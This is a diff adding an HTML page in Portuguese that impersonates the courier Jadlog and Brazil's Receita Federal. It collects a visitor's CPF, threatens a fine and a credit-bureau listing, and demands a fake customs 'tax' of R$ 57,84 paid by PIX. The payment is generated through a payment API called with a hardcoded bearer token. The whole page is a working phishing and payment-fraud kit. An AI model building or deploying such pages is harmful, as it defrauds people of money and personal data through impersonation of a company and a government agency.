@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jadlog - Sua encomenda no melhor caminho.</title>
+    <link rel="shortcut icon" href="../../jadlog/img/favicon.png">
+    <link rel="apple-touch-icon" href="../../jadlog/img/favicon.png">
+    <link href="css2.html" rel="stylesheet">
+    <link rel="stylesheet" href="css/styles.css">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            background-color: #f8f8f8;
+            margin-top: 20px;
+        }
+
+        .footer .read-more {
+            cursor: pointer;
+            color: blue;
+            text-decoration: underline;
+        }
+
+        .footer .hidden-content {
+            display: none;
+            margin-top: 10px;
+            color: #333;
+        }
+    </style>
+    <!-- Google tag (gtag.js) -->
+    <script async="" src="js_1.html"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('js', new Date());
+
+        gtag('config', 'G-HHVFX3HTTL');
+    </script>
+</head>
+
+<body>
+    <div class="cpf-overlay">
+        <div class="cpf-content">
+            <img src="images/logo-jadlog-256.png" alt="Logo" style="width: 150px; height: auto;">
+            <div class="cpf-header">ACOMPANHE SEU PEDIDO</div>
+            <div class="cpf-info">Para acompanhar seu pedido, preencha o campo abaixo com os dados fornecidos durante a compra.</div>
+            <form method="get" action="">
+                <input type="tel" name="cpf" id="cpfInput" class="cpf-input" placeholder="CPF" maxlength="14" required="">
+                <button type="submit" class="cpf-button">Acompanhar Pedido</button>
+            </form>
+            <div id="error-message" class="error"></div>
+        </div>
+    </div>
+
+    <div class="popup-overlay" style="display: none;">
+        <div class="popup-content">
+            <img src="images/receita-federal-logo.png" alt="Logo" style="width: 150px;height: auto;margin-bottom: 3px;">
+            <img src="images/receitacolorido.jpg" alt="Logo" style="width: 70px;height: auto;margin-bottom: 3px;float: right;opacity: 0.8;">
+            <div class="popup-greeting">Dados Encontrados</div>
+            <div class="order-info">
+                <p>Titular:<br><span id="nome">{{ Nome }}</span></p>
+                <p style="margin: -4px 0;font-size: 12px;color: #000000;font-weight: 100;">
+                    Cidade: <span id="cidade"></span>
+                </p>
+            </div>
+            <div class="popup-header">SUJEITO A MULTA DE R$ 1.872,91</div>
+            <div class="popup-warning-logo">
+                <div class="popup-warning"><span class="atenc">Atenção:</span> Caso o pagamento do tributo não seja realizado para o despacho do seu pedido, uma multa será registrada no SPC/Serasa no<br><p></p>
+                    <span class="atenc">Titular: </span><b id="warningNome">{{ Nome }}</b><br><span class="atenc">CPF:</span> <b id="warningCPF">{{ cpf }}</b>
+                </div>
+            </div>
+            <div class="popup-taxes">
+                <ul>
+                    <li><span class="tax-name">Processamento Eletrônico</span><span class="tax-amount">R$ 12,67</span></li>
+                    <li><span class="tax-name">ICMS</span><span class="tax-amount">R$ 21,74</span></li>
+                    <li><span class="tax-name">Contribuição Federal</span><span class="tax-amount">R$ 23,43</span></li>
+                </ul>
+            </div>
+            <div class="popup-total"><span>Total:</span> R$ 57,84</div>
+
+            <!-- Novo bloco de geração de PIX -->
+            <div class="pix-code">
+                <button onclick="generatePix()">Gerar PIX</button>
+                <button id="copy-button" onclick="copyPixCode()" disabled>Copiar Código PIX</button>
+                <input type="text" id="pix-code" placeholder="Código PIX ainda não gerado" readonly>
+                <div class="qr-code">
+                    <img id="qr-code-image" src="" alt="QR Code PIX" width="200" style="display: none;">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const form = document.querySelector('.cpf-content form');
+            const cpfInput = document.getElementById('cpfInput');
+            const popupOverlay = document.querySelector('.popup-overlay');
+            const errorMessage = document.getElementById('error-message');
+            const timerElement = document.getElementById('timer');
+
+            cpfInput.addEventListener('input', function () {
+                let value = cpfInput.value.replace(/\D/g, '');
+                if (value.length > 3) value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                if (value.length > 7) value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+                if (value.length > 11) value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
+                cpfInput.value = value;
+            });
+
+            function formatCPF(cpf) {
+                return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+            }
+
+            async function generatePix() {
+                console.log("Iniciando a geração do PIX...");
+                const apiUrl = "https://api.pushinpay.com.br/api/pix/cashIn";
+                const apiToken = "Bearer 1201|hEDwWSjBmpQAzXjj20r4ltqFyOlXDBeBdUzRi03za30501d4";
+
+                const requestData = {
+                    value: 5784, // Valor do PIX em centavos (R$ 57,84)
+                    webhook_url: "http://seusite.com/webhook"
+                };
+
+                try {
+                    const response = await fetch(apiUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                            "Authorization": apiToken
+                        },
+                        body: JSON.stringify(requestData)
+                    });
+
+                    if (!response.ok) {
+                        throw new Error(`Erro na API: ${response.statusText}`);
+                    }
+
+                    const data = await response.json();
+                    console.log("Resposta da API:", data);
+
+                    document.getElementById("pix-code").value = data.qr_code;
+                    const qrImage = document.getElementById("qr-code-image");
+                    qrImage.src = data.qr_code_base64;
+                    qrImage.style.display = "block";
+
+                    document.getElementById("copy-button").disabled = false;
+                    console.log("PIX gerado com sucesso e botão de copiar habilitado.");
+                } catch (error) {
+                    console.error("Erro ao gerar o PIX:", error);
+                    alert("Erro ao gerar o PIX. Verifique os logs no console.");
+                }
+            }
+
+            function copyPixCode() {
+                const pixInput = document.getElementById("pix-code");
+                pixInput.select();
+                document.execCommand("copy");
+                alert("Código PIX copiado!");
+            }
+        });
+    </script>
+</body>
+</html>
